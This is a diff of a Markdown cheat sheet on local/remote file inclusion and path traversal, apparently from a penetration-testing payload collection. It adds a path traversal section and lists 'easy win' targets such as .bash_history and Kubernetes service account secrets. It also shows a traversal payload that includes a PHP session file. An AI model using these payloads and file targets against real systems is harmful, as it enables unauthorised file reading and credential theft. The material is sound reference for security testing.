@@ -1,13 +1,16 @@
-# Local/Remote File Inclusion
+# File Inclusion - Path Traversal
 
 The File Inclusion vulnerability allows an attacker to include a file, usually exploiting a "dynamic file inclusion" mechanisms implemented in the target application.
 
+The Path Traversal vulnerability allows an attacker to access a file, usually exploiting a "reading" mechanism implemented in the target application
+
 ## Summary
 
+* [Path Traversal](#path-traversal)
 * [Basic LFI](#basic-lfi)
 * [Basic RFI](#basic-rfi)
 * [LFI / RFI using wrappers](#lfi--rfi-using-wrappers)
-  * [Wrapper php://filter](l#wrapper-phpfilter)
+  * [Wrapper php://filter](#wrapper-phpfilter)
   * [Wrapper zip://](#wrapper-zip)
   * [Wrapper data://](#wrapper-data)
   * [Wrapper expect://](#wrapper-expect)
@@ -20,6 +23,9 @@ The File Inclusion vulnerability allows an attacker to include a file, usually e
 * [LFI to RCE via phpinfo()](#lfi-to-rce-via-phpinfo)
 * [LFI to RCE via controlled log file](#lfi-to-rce-via-controlled-log-file)
 * [LFI to RCE via PHP sessions](#lfi-to-rce-via-php-sessions)
+
+
+## Path Traversal
 
 Linux - Interesting files to check out :
 
@@ -79,6 +85,13 @@ The following log files are controllable and can be included with an evil payloa
 /var/log/vsftpd.log
 /var/log/sshd.log
 /var/log/mail
+```
+
+Other easy win files.
+
+```powershell
+/home/$USER/.bash_history
+/var/run/secrets/kubernetes.io/serviceaccount
 ```
 
 ## Basic LFI
@@ -326,7 +339,7 @@ Use the LFI to include the PHP session file
 login=1&user=admin&pass=password&lang=/../../../../../../../../../var/lib/php5/sess_i56kgbsq9rm8ndg3qbarhsbm27
 ```
 
-## Thanks to
+## References
 
 * [OWASP LFI](https://www.owasp.org/index.php/Testing_for_Local_File_Inclusion)
 * [HighOn.coffee LFI Cheat](https://highon.coffee/blog/lfi-cheat-sheet/)
